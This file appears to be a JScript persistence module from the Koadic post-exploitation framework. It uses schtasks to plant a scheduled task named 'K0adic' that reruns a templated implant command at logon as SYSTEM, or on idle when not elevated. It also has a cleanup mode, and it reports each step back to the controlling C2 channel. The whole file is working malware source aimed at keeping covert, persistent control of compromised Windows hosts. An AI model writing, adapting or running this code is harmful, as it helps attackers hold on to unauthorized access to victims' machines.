try
{
    var headers = {};
    var taskname = "K0adic";
    if (~CLEANUP~)
    {
        var result = Koadic.shell.exec("schtasks /delete /tn "+taskname+" /f", "~DIRECTORY~\\"+Koadic.uuid()+".txt");
        headers["Task"] = "DeleteTask";
        Koadic.work.report(result, headers);
    }
    else
    {
        var result = Koadic.shell.exec("schtasks /query /tn "+taskname, "~DIRECTORY~\\"+Koadic.uuid()+".txt");
        headers["Task"] = "QueryTask";
        Koadic.work.report(result, headers);
        if (~NOFORCE~)
        {
            if (result.indexOf("ERROR") == -1)
            {
                result = Koadic.shell.exec("schtasks /delete /tn "+taskname+" /f", "~DIRECTORY~\\"+Koadic.uuid()+".txt");
                headers["Task"] = "NoForceTask";
                Koadic.work.report("", headers);
            }
        }
        if (~ELEVATED~)
        {
            result = Koadic.shell.exec("schtasks /create /tn "+taskname+" /tr \"~CMD~\" /sc onlogon /ru System /f", "~DIRECTORY~\\"+Koadic.uuid()+".txt");
        }
        else
        {
            result = Koadic.shell.exec("schtasks /create /tn "+taskname+" /tr \"~CMD~\" /sc onidle /i 1 /f", "~DIRECTORY~\\"+Koadic.uuid()+".txt");
        }
        headers["Task"] = "AddTask";
        Koadic.work.report(result, headers);
    }
    Koadic.work.report("Complete");
}
catch (e)
{
    Koadic.work.error(e);
}
Koadic.exit();
